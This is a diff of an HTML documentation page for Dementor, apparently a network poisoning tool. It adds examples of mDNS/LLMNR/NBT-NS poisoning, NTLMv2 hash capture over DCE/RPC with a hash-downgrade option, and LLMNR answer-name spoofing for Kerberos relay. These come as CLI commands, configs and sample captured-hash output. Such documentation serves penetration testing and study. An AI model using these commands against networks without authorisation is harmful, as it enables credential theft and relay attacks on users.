@@ -2,7 +2,7 @@
 <html lang="en" data-accent-color="cyan" data-content_root="../">
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Multicast Poisoning ⚙️ - Dementor 1.0.0.dev1 documentation</title><link rel="shortcut icon" href="../_static/favicon.ico"/><link rel="index" title="Index" href="../genindex.html" /><link rel="search" title="Search" href="../search.html" /><link rel="next" title="Rogue Kerberos KDC" href="kdc.html" /><link rel="prev" title="Custom Protocols ⚙️" href="../proto.html" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Multicast Poisoning ⚙️ - Dementor 1.0.0.dev2 documentation</title><link rel="shortcut icon" href="../_static/favicon.ico"/><link rel="index" title="Index" href="../genindex.html" /><link rel="search" title="Search" href="../search.html" /><link rel="next" title="Rogue Kerberos KDC" href="kdc.html" /><link rel="prev" title="Custom Protocols ⚙️" href="../proto.html" />
       <link rel="canonical" href="https://matrixeditor.github.io/dementor/examples/multicast.html" /><script>
     function setColorMode(t){let e=document.documentElement;e.setAttribute("data-color-mode",t);let a=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,s=t;"auto"===t&&(s=a?"dark":"light"),"light"===s?(e.classList.remove("dark"),e.classList.add("light")):(e.classList.remove("light"),e.classList.add("dark"))}
     setColorMode(localStorage._theme||"dark");
@@ -131,6 +131,7 @@ data-aria-dark="Switch to auto color mode">
 <li class="toctree-l2"><a class="reference internal" href="../config/quic.html">QUIC</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../config/ldap.html">LDAP &#9881;&#65039;</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../config/http.html">HTTP</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../config/dcerpc.html">DCE/RPC</a></li>
 </ul>
 </li>
 <li class="toctree-l1 _expand"><a class="reference internal" href="../config/logging.html">Logging</a></li>
@@ -145,10 +146,13 @@ data-aria-dark="Switch to auto color mode">
       <i class="i-lucide close"></i>
     </button>
     <div class="sy-scrollbar sy-rside-inner px-6 xl:top-16 xl:sticky xl:pl-0 pt-6 pb-4"><div class="localtoc"><h3>On this page</h3><ul>
-<li><a class="reference internal" href="#example-multicast-mdns">Multicast Poisoning</a></li>
+<li><a class="reference internal" href="#classic-multicast-poisoning">Classic Multicast Poisoning</a></li>
+<li><a class="reference internal" href="#using-multicast-poisoning-for-dce-rpc-calls">Using Multicast Poisoning for DCE/RPC Calls</a></li>
 <li><a class="reference internal" href="#llmnr-answer-name-spoofing">LLMNR Answer-Name Spoofing</a></li>
 </ul>
-</div><div id="ethical-ad-placement" data-ea-publisher="readthedocs"></div></div>
+</div><div class="edit-this-page">
+  <a href="https://github.com/MatrixEditor/dementor/blob/main/docs/examples/multicast.rst">Edit this page</a>
+</div></div>
   </aside>
   <div class="rside-overlay js-menu" role="button" aria-label="Close Table of Contents" aria-controls="rside" aria-expanded="false"></div>
   <main class="sy-main w-full max-sm:max-w-full print:pt-6"><div class="sy-breadcrumbs" role="navigation">
@@ -178,15 +182,27 @@ data-aria-dark="Switch to auto color mode">
         <article class="yue" role="main">
           <section id="multicast-poisoning">
 <span id="examples-multicast"></span><h1>Multicast Poisoning ⚙️<a class="headerlink" href="#multicast-poisoning" title="Link to this heading">¶</a></h1>
-<section id="example-multicast-mdns">
-<span id="id1"></span><h2>Multicast Poisoning<a class="headerlink" href="#example-multicast-mdns" title="Link to this heading">¶</a></h2>
-<p>To enable multicast poisoning, you have to enable the poisoners in the configuration file
-(<a class="reference internal" href="../config/main.html#Dementor.mDNS" title="Dementor.mDNS"><code class="xref py py-attr docutils literal notranslate"><span class="pre">Dementor.mDNS</span></code></a>, <a class="reference internal" href="../config/main.html#Dementor.NBTNS" title="Dementor.NBTNS"><code class="xref py py-attr docutils literal notranslate"><span class="pre">Dementor.NBTNS</span></code></a> and <a class="reference internal" href="../config/main.html#Dementor.LLMNR" title="Dementor.LLMNR"><code class="xref py py-attr docutils literal notranslate"><span class="pre">Dementor.LLMNR</span></code></a>).</p>
-<p>A service discovery can be triggered from a Windows host for example (assuming mDNS is
-active). For instance, when trying to access file share <code class="docutils literal notranslate"><span class="pre">FILESERVER01</span></code> in the File
-Explorer, Windows falls back to mDNS if the name can’t be resolved through normal DNS
-queries.</p>
-<p>The output of Dementor should look like this (analyze mode):</p>
+<section id="classic-multicast-poisoning">
+<span id="example-multicast-mdns"></span><h2>Classic Multicast Poisoning<a class="headerlink" href="#classic-multicast-poisoning" title="Link to this heading">¶</a></h2>
+<p>To enable multicast poisoning, activate the poisoners in the configuration file
+(<a class="reference internal" href="../config/main.html#Dementor.mDNS" title="Dementor.mDNS"><code class="xref py py-attr docutils literal notranslate"><span class="pre">Dementor.mDNS</span></code></a>, <a class="reference internal" href="../config/main.html#Dementor.NBTNS" title="Dementor.NBTNS"><code class="xref py py-attr docutils literal notranslate"><span class="pre">Dementor.NBTNS</span></code></a>, and <a class="reference internal" href="../config/main.html#Dementor.LLMNR" title="Dementor.LLMNR"><code class="xref py py-attr docutils literal notranslate"><span class="pre">Dementor.LLMNR</span></code></a>).</p>
+<div class="sphinx-tabs docutils container">
+<div aria-label="Tabbed content" class="closeable" role="tablist"><button aria-controls="panel-0-0-0" aria-selected="true" class="sphinx-tabs-tab" id="tab-0-0-0" name="0-0" role="tab" tabindex="0">Dementor.toml</button><button aria-controls="panel-0-0-1" aria-selected="false" class="sphinx-tabs-tab" id="tab-0-0-1" name="0-1" role="tab" tabindex="-1">CLI</button></div><div aria-labelledby="tab-0-0-0" class="sphinx-tabs-panel" id="panel-0-0-0" name="0-0" role="tabpanel" tabindex="0"><div class="highlight-toml notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="k">[Dementor]</span>
+</span><span data-line="2"><span class="c1"># [...]</span>
+</span><span data-line="3"><span class="hll"><span class="n">mDNS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span>
+</span></span><span data-line="4"><span class="hll"><span class="n">LLMNR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span>
+</span></span><span data-line="5"><span class="hll"><span class="n">NBTNS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span>
+</span></span><span data-line="6"><span class="c1"># [...]</span>
+</span></pre></div>
+</div>
+</div><div aria-labelledby="tab-0-0-1" class="sphinx-tabs-panel" hidden="true" id="panel-0-0-1" name="0-1" role="tabpanel" tabindex="0"><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="gp">$ </span>Dementor<span class="w"> </span>-I<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$INTERFACE</span><span class="s2">&quot;</span><span class="w"> </span>-O<span class="w"> </span><span class="nv">LLMNR</span><span class="o">=</span>On<span class="w"> </span>-O<span class="w"> </span><span class="nv">mDNS</span><span class="o">=</span>On<span class="w"> </span>-O<span class="w"> </span><span class="nv">NBTNS</span><span class="o">=</span>On
+</span></pre></div>
+</div>
+</div></div>
+<p>You can trigger a discovery request from a Windows host, assuming mDNS is active. For example,
+trying to access the file share <code class="docutils literal notranslate"><span class="pre">\\FILESERVER01</span></code> via File Explorer causes Windows to fall back to
+mDNS when DNS resolution fails.</p>
+<p>Dementor output in analyze mode should look like this:</p>
 <div class="demo docutils container">
 <div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="gp">$ </span>Dementor<span class="w"> </span>-I<span class="w"> </span>&lt;INTERFACE&gt;<span class="w"> </span>-A
 </span><span data-line="2"><span class="go">[...]</span>
@@ -196,44 +212,95 @@ queries.</p>
 </span></pre></div>
 </div>
 </div>
-<p>The Windows host sends two queries, one for IPv4 (<code class="docutils literal notranslate"><span class="pre">A</span></code>) and one for IPv6 (<code class="docutils literal notranslate"><span class="pre">AAAA</span></code>). This packet is
-sent via Layer 2 broadcast and Layer 3 multicast to all devices on the subnet (mDNS is link-local
-only). All devices listening on port <code class="docutils literal notranslate"><span class="pre">5353</span></code> receive it.</p>
+<p>The Windows client issues two queries: one for IPv4 (<code class="docutils literal notranslate"><span class="pre">A</span></code>) and one for IPv6 (<code class="docutils literal notranslate"><span class="pre">AAAA</span></code>). These are
+sent using Layer 2 broadcast and Layer 3 multicast to all devices on the subnet. Since mDNS is
+link-local only, all hosts listening on port <code class="docutils literal notranslate"><span class="pre">5353</span></code> will receive the request.</p>
+<hr class="docutils" />
 </section>
-<section id="llmnr-answer-name-spoofing">
-<span id="examples-multicast-llmnr-answername"></span><h2>LLMNR Answer-Name Spoofing<a class="headerlink" href="#llmnr-answer-name-spoofing" title="Link to this heading">¶</a></h2>
-<p>Building on standard multicast poisoning techniques, Synacktiv introduced an advanced method that
-enables Kerberos relaying attacks through manipulated response names. This behavior can be triggered
-by setting a custom <a class="reference internal" href="../config/llmnr.html#LLMNR.AnswerName" title="LLMNR.AnswerName"><code class="xref py py-attr docutils literal notranslate"><span class="pre">LLMNR.AnswerName</span></code></a>.</p>
-<div class="admonition seealso">
-<p class="admonition-title">See also</p>
-<p>Synacktiv’s excellent write-up on how to leverage this behavior for pre-authenticated Kerberos relay:
-<a class="reference external" href="https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with">Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx</a></p>
-</div>
+<section id="using-multicast-poisoning-for-dce-rpc-calls">
+<span id="examples-multicast-rpc"></span><h2>Using Multicast Poisoning for DCE/RPC Calls<a class="headerlink" href="#using-multicast-poisoning-for-dce-rpc-calls" title="Link to this heading">¶</a></h2>
+<p>Multicast poisoning can also be used to capture NTLM hashes via DCE/RPC requests using Dementor’s
+built-in <a class="reference internal" href="../config/dcerpc.html#config-dcerpc"><span class="std std-ref">DCE/RPC</span></a> service. By default, any call involving DCOM or the Endpoint Mapper (EPM)
+is available.</p>
 <div class="sphinx-tabs docutils container">
-<div aria-label="Tabbed content" class="closeable" role="tablist"><button aria-controls="panel-0-0-0" aria-selected="true" class="sphinx-tabs-tab" id="tab-0-0-0" name="0-0" role="tab" tabindex="0">Dementor.toml</button><button aria-controls="panel-0-0-1" aria-selected="false" class="sphinx-tabs-tab" id="tab-0-0-1" name="0-1" role="tab" tabindex="-1">CLI</button></div><div aria-labelledby="tab-0-0-0" class="sphinx-tabs-panel" id="panel-0-0-0" name="0-0" role="tabpanel" tabindex="0"><div class="highlight-toml notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="k">[LLMNR]</span>
-</span><span data-line="2"><span class="hll"><span class="n">AnswerName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;other-srv&quot;</span>
-</span></span></pre></div>
+<div aria-label="Tabbed content" class="closeable" role="tablist"><button aria-controls="panel-1-1-0" aria-selected="true" class="sphinx-tabs-tab" id="tab-1-1-0" name="1-0" role="tab" tabindex="0">Dementor.toml</button><button aria-controls="panel-1-1-1" aria-selected="false" class="sphinx-tabs-tab" id="tab-1-1-1" name="1-1" role="tab" tabindex="-1">CLI</button></div><div aria-labelledby="tab-1-1-0" class="sphinx-tabs-panel" id="panel-1-1-0" name="1-0" role="tabpanel" tabindex="0"><div class="highlight-toml notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="k">[Dementor]</span>
+</span><span data-line="2"><span class="c1"># [...]</span>
+</span><span data-line="3"><span class="hll"><span class="n">RPC</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span>
+</span></span><span data-line="4"><span class="c1"># [...]</span>
+</span></pre></div>
 </div>
-</div><div aria-labelledby="tab-0-0-1" class="sphinx-tabs-panel" hidden="true" id="panel-0-0-1" name="0-1" role="tabpanel" tabindex="0"><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="gp">$ </span>Dementor<span class="w"> </span>-I<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$INTERFACE</span><span class="s2">&quot;</span><span class="w"> </span>-O<span class="w"> </span>LLMNR.AnswerName<span class="o">=</span><span class="s2">&quot;other-srv&quot;</span>
+</div><div aria-labelledby="tab-1-1-1" class="sphinx-tabs-panel" hidden="true" id="panel-1-1-1" name="1-1" role="tabpanel" tabindex="0"><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="gp">$ </span>Dementor<span class="w"> </span>-I<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$INTERFACE</span><span class="s2">&quot;</span><span class="w"> </span>-O<span class="w"> </span><span class="nv">RPC</span><span class="o">=</span>On
 </span></pre></div>
 </div>
 </div></div>
+<div class="admonition hint">
+<p class="admonition-title">Hint</p>
+<p>You can attempt to downgrade the captured NTLM hash using <a class="reference internal" href="../config/ntlm.html#NTLM.ExtendedSessionSecurity" title="NTLM.ExtendedSessionSecurity"><code class="xref py py-attr docutils literal notranslate"><span class="pre">NTLM.ExtendedSessionSecurity</span></code></a>.
+To test this via the CLI:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="gp">$ </span>Dementor<span class="w"> </span>-I<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$INTERFACE</span><span class="s2">&quot;</span><span class="w"> </span>-O<span class="w"> </span><span class="nv">RPC</span><span class="o">=</span>On<span class="w"> </span>-O<span class="w"> </span>RPC.ExtendedSessionSecurity<span class="o">=</span>Off
+</span></pre></div>
+</div>
+</div>
+<p>To trigger a multicast-based RPC call, use a Windows tool such as <code class="docutils literal notranslate"><span class="pre">gpresult</span></code> to request Group
+Policy data from a machine whose name will be resolved via mDNS:</p>
 <div class="demo docutils container">
-<div class="literal-block-wrapper docutils container" id="id2">
-<div class="code-block-caption"><span class="caption-text">Dementor output if <a class="reference internal" href="../config/llmnr.html#LLMNR.AnswerName" title="LLMNR.AnswerName"><code class="xref py py-attr docutils literal notranslate"><span class="pre">LLMNR.AnswerName</span></code></a> is set (here <code class="docutils literal notranslate"><span class="pre">&quot;other-srv&quot;</span></code>)</span><a class="headerlink" href="#id2" title="Link to this code">¶</a></div>
-<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="go">LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [*] Query for SomeService (type: A)</span>
-</span><span data-line="2"><span class="go">LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [+] Sent poisoned answer to fe80::8930:4b9c:f67c:f9bf (spoofed name: other-srv)</span>
-</span><span data-line="3"><span class="go">LLMNR      192.168.56.116            5355   [*] Query for SomeService (type: A)</span>
-</span><span data-line="4"><span class="go">LLMNR      192.168.56.116            5355   [+] Sent poisoned answer to 192.168.56.116 (spoofed name: other-srv)</span>
-</span><span data-line="5"><span class="go">LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [*] Query for SomeService (type: AAAA)</span>
-</span><span data-line="6"><span class="go">LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [+] Sent poisoned answer to fe80::8930:4b9c:f67c:f9bf (spoofed name: other-srv)</span>
-</span><span data-line="7"><span class="go">LLMNR      192.168.56.116            5355   [*] Query for SomeService (type: AAAA)</span>
-</span><span data-line="8"><span class="go">LLMNR      192.168.56.116            5355   [+] Sent poisoned answer to 192.168.56.116 (spoofed name: other-srv)</span>
-</span><span data-line="9"><span class="go">LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [*] Query for SomeService (type: A)</span>
-</span><span data-line="10"><span class="go">LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [+] Sent poisoned answer to fe80::8930:4b9c:f67c:f9bf (spoofed name: other-srv)</span>
-</span><span data-line="11"><span class="go">LLMNR      192.168.56.116            5355   [*] Query for SomeService (type: A)</span>
-</span><span data-line="12"><span class="go">LLMNR      192.168.56.116            5355   [+] Sent poisoned answer to 192.168.56.116 (spoofed name: other-srv)</span>
+<div class="highlight-text notranslate"><div class="highlight"><pre><span></span><span data-line="1">PS C:\Users\padawan&gt; gpresult /S GROUPOLICYSRV /Z
+</span><span data-line="2">Type the password for OUTPOST\padawan:
+</span></pre></div>
+</div>
+</div>
+<p>If successful, Dementor will output something similar, including a captured NTLMv2 hash:</p>
+<div class="demo docutils container">
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="gp">$ </span>Dementor<span class="w"> </span>-I<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$INTERFACE</span><span class="s2">&quot;</span><span class="w"> </span>-O<span class="w"> </span><span class="nv">RPC</span><span class="o">=</span>On
+</span><span data-line="2"><span class="gp"># </span><span class="o">[</span>...<span class="o">]</span>
+</span><span data-line="3"><span class="go">MDNS       192.168.56.120            5353   [*] Request for GROUPOLICYSRV.local (class: IN, type: AAAA)</span>
+</span><span data-line="4"><span class="hll"><span class="go">MDNS       192.168.56.120            5353   [+] Sent poisoned answer to 192.168.56.120</span>
+</span></span><span data-line="5"><span class="gp"># </span><span class="o">[</span>...<span class="o">]</span>
+</span><span data-line="6"><span class="go">DCE/RPC    192.168.56.120 135    [*] Bind request for [MS-DCOM]: Distributed Component Object Model (DCOM) Remote v0.0 (TransferSyntax Negotiation)</span>
+</span><span data-line="7"><span class="go">DCE/RPC    192.168.56.120 135    [*] Bind request for [MS-DCOM]: Distributed Component Object Model (DCOM) Remote v0.0 (NTLMSSP_NEGOTIATE)</span>
+</span><span data-line="8"><span class="hll"><span class="go">DCE/RPC    192.168.56.120 135    [+] Captured NTLMv2 Hash for padawan/OUTPOST from fe80::a0c0:8ed2:6788:65f1:</span>
+</span></span><span data-line="9"><span class="hll"><span class="go">DCE/RPC    192.168.56.120 135    NTLMv2 Username: padawan</span>
+</span></span><span data-line="10"><span class="hll"><span class="go">DCE/RPC    192.168.56.120 135    NTLMv2 Hash: padawan::OUTPOST:313333374c454554:025aae2633c04b165fe8a601ed483fa4[...]</span>
+</span></span></pre></div>
+</div>
+</div>
+<hr class="docutils" />
+</section>
+<section id="llmnr-answer-name-spoofing">
+<span id="examples-multicast-llmnr-answername"></span><h2>LLMNR Answer-Name Spoofing<a class="headerlink" href="#llmnr-answer-name-spoofing" title="Link to this heading">¶</a></h2>
+<p>Beyond traditional multicast poisoning, Synacktiv introduced a technique that enables Kerberos
+relaying via spoofed response names. This can be triggered by setting a custom
+<a class="reference internal" href="../config/llmnr.html#LLMNR.AnswerName" title="LLMNR.AnswerName"><code class="xref py py-attr docutils literal notranslate"><span class="pre">LLMNR.AnswerName</span></code></a>.</p>
+<div class="sphinx-tabs docutils container">
+<div aria-label="Tabbed content" class="closeable" role="tablist"><button aria-controls="panel-2-2-0" aria-selected="true" class="sphinx-tabs-tab" id="tab-2-2-0" name="2-0" role="tab" tabindex="0">Dementor.toml</button><button aria-controls="panel-2-2-1" aria-selected="false" class="sphinx-tabs-tab" id="tab-2-2-1" name="2-1" role="tab" tabindex="-1">CLI</button></div><div aria-labelledby="tab-2-2-0" class="sphinx-tabs-panel" id="panel-2-2-0" name="2-0" role="tabpanel" tabindex="0"><div class="highlight-toml notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="k">[LLMNR]</span>
+</span><span data-line="2"><span class="hll"><span class="n">AnswerName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;other-srv&quot;</span>
+</span></span></pre></div>
+</div>
+</div><div aria-labelledby="tab-2-2-1" class="sphinx-tabs-panel" hidden="true" id="panel-2-2-1" name="2-1" role="tabpanel" tabindex="0"><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="gp">$ </span>Dementor<span class="w"> </span>-I<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$INTERFACE</span><span class="s2">&quot;</span><span class="w"> </span>-O<span class="w"> </span>LLMNR.AnswerName<span class="o">=</span><span class="s2">&quot;other-srv&quot;</span>
+</span></pre></div>
+</div>
+</div></div>
+<div class="admonition seealso">
+<p class="admonition-title">See also</p>
+<p>Synacktiv’s excellent write-up on abusing this for pre-authenticated Kerberos relay attacks:</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with">Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx</a></p></li>
+</ul>
+</div>
+<p>Example output when using a spoofed LLMNR answer name:</p>
+<div class="demo docutils container">
+<div class="literal-block-wrapper docutils container" id="id1">
+<div class="code-block-caption"><span class="caption-text">Dementor output if <a class="reference internal" href="../config/llmnr.html#LLMNR.AnswerName" title="LLMNR.AnswerName"><code class="xref py py-attr docutils literal notranslate"><span class="pre">LLMNR.AnswerName</span></code></a> is set (here <code class="docutils literal notranslate"><span class="pre">&quot;other-srv&quot;</span></code>)</span><a class="headerlink" href="#id1" title="Link to this code">¶</a></div>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span data-line="1"><span class="go">LLMNR      192.168.56.116            5355   [*] Query for SomeService (type: A)</span>
+</span><span data-line="2"><span class="hll"><span class="go">LLMNR      192.168.56.116            5355   [+] Sent poisoned answer to 192.168.56.116 (spoofed name: other-srv)</span>
+</span></span><span data-line="3"><span class="go">LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [*] Query for SomeService (type: AAAA)</span>
+</span><span data-line="4"><span class="hll"><span class="go">LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [+] Sent poisoned answer to fe80::8930:4b9c:f67c:f9bf (spoofed name: other-srv)</span>
+</span></span><span data-line="5"><span class="go">LLMNR      192.168.56.116            5355   [*] Query for SomeService (type: AAAA)</span>
+</span><span data-line="6"><span class="go">LLMNR      192.168.56.116            5355   [+] Sent poisoned answer to 192.168.56.116 (spoofed name: other-srv)</span>
+</span><span data-line="7"><span class="go">LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [*] Query for SomeService (type: A)</span>
+</span><span data-line="8"><span class="go">LLMNR      fe80::8930:4b9c:f67c:f9bf 5355   [+] Sent poisoned answer to fe80::8930:4b9c:f67c:f9bf (spoofed name: other-srv)</span>
+</span><span data-line="9"><span class="go">LLMNR      192.168.56.116            5355   [*] Query for SomeService (type: A)</span>
+</span><span data-line="10"><span class="go">LLMNR      192.168.56.116            5355   [+] Sent poisoned answer to 192.168.56.116 (spoofed name: other-srv)</span>
 </span></pre></div>
 </div>
 </div>
@@ -284,7 +351,7 @@ by setting a custom <a class="reference internal" href="../config/llmnr.html#LLM
     </div>
   </div>
 </footer>
-      <script src="../_static/documentation_options.js?v=9a09b0f8"></script>
+      <script src="../_static/documentation_options.js?v=3759c034"></script>
       <script src="../_static/doctools.js?v=9bcbadda"></script>
       <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
       <script src="../_static/clipboard.min.js?v=a7894cd8"></script>
